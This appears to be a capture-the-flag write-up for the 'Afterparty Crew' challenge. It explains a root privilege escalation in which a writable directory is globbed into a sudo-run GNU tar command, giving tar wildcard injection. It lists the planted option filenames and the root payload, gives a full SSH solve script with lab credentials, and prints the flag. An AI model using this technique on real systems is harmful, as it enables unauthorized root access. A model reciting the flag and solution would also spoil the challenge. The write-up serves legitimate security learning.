---
title: "Afterparty Crew"
ctf: "Safaricom CTF"
date: 2026-10-06
category: misc
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "Strawhats"
---

# Afterparty Crew

> **Category:** MISC · **Points:** 300 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

Desk: http://54.72.82.22:8550/ — SSH `player@54.72.82.22:8710` pw `matinee-visitor`.

## Box shape
- `/app/service.py` runs as root (kind `linux-tar`) but its routes only expose the web
  `/submit` answer-hash check + a `/api/...` dispatch that contains no exploitable
- Installer `/app/linux/install.sh` grants:
  `player ALL=(root) NOPASSWD: /usr/local/bin/pack-stage`
- `/usr/local/bin/pack-stage` (root):
  ```sh
  cd /home/player/sets
  /usr/bin/tar -cf /tmp/night.tar *
  ```
- `start.sh` writes the flag to `/root/receipt` (mode 400, root-only). `ls -ld /root` = 700.
  So the goal is just root file read.

## Vector: GNU tar wildcard injection
`/home/player/sets` is player-writable and the `*` glob is expanded by root's shell,
so filenames beginning with `-` are parsed by GNU tar (1.35) as options.
Create in `sets/`:
- `--checkpoint=1`               (enable a checkpoint on every record)
- `--checkpoint-action=exec=sh p.sh`  (run a command at the checkpoint)
- `p.sh` containing `cp /root/receipt /tmp/r.txt; chmod 644 /tmp/r.txt`
- `keep.txt` (a normal member so tar has something to write)

Then `sudo -n /usr/local/bin/pack-stage` runs tar as root, fires the checkpoint, and
`p.sh` executes as root. Read `/tmp/r.txt`.

Note: the action command cannot contain `/` (a filename with `/` is treated as a path),
so the payload lives in `p.sh` referenced relatively from tar's cwd.

## Sibling hint (Workshop Nocturne, HMAC manifest worker) — not this box
No inbox-polling root worker or HMAC/`manifest.json` gate exists here; `inbox/` is empty
and `ps auxww` shows only `/app/service.py` + sshd. This box's intended path is the
NOPASSWD `pack-stage` tar wildcard above.

## Artifacts
None downloaded; nothing to hash.

## Solve script

`misc/afterparty-crew/solve.py`:

```python
#!/usr/bin/env python3
"""Afterparty Crew (misc / linux-tar).

SSH as player, then abuse the NOPASSWD `pack-stage` helper:

    /usr/local/bin/pack-stage  ->  cd /home/player/sets; tar -cf /tmp/night.tar *

`sets/` is player-writable and the glob is expanded by root's shell, so files
named like tar options are parsed as options by root's GNU tar. We plant
`--checkpoint=1` + `--checkpoint-action=exec=sh p.sh`, where p.sh (referenced
relatively, since a filename may not contain '/') copies /root/receipt out.

Run with the paramiko venv:
  /home/nomad/safaricom_ctf/.venv/bin/python solve.py
"""
import re
import sys

import paramiko

HOST, PORT = "54.72.82.22", 8710
USER, PW = "player", "matinee-visitor"

PLANT = r"""
import os, glob, shutil
d = '/home/player/sets'
for f in glob.glob(d + '/*'):
    shutil.rmtree(f) if os.path.isdir(f) else os.remove(f)
open(d + '/keep.txt', 'w').write('keep\n')
open(d + '/--checkpoint=1', 'w').close()
open(d + '/--checkpoint-action=exec=sh p.sh', 'w').close()
open(d + '/p.sh', 'w').write('cp /root/receipt /tmp/r.txt; chmod 644 /tmp/r.txt\n')
"""


def run(cli, cmd, stdin=None):
    _, out, err = cli.exec_command(cmd, timeout=60)
    if stdin is not None:
        stdin.write(stdin)
        stdin.channel.shutdown_write()
    return out.read().decode(errors="replace") + err.read().decode(errors="replace")


def main():
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, port=PORT, username=USER, password=PW, timeout=20)

    print("[*] planting tar option-files in ~/sets")
    i, _, _ = c.exec_command("python3 -", timeout=60)
    i.write(PLANT)
    i.channel.shutdown_write()
    i.channel.recv_exit_status()

    print("[*] running: sudo -n /usr/local/bin/pack-stage")
    print(run(c, "sudo -n /usr/local/bin/pack-stage"))

    out = run(c, "cat /tmp/r.txt")
    print(out)
    m = re.search(r"safctf\{[0-9a-f]{32}\}", out)
    if not m:
        print("[-] flag not found")
        return 1
    print("FLAG:", m.group(0))
    c.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

## Tools

**Used in this solve:**

- Python 3 (solver)

**Other tools that fit this category:**

- CyberChef (encoding chains)
- z3 / SageMath (constraints)
- pwntools (interaction)
- Ciphey (auto-decode)

## Flag

```
safctf{66bda7b8ede495eb131f6bf5bbb9d889}
```
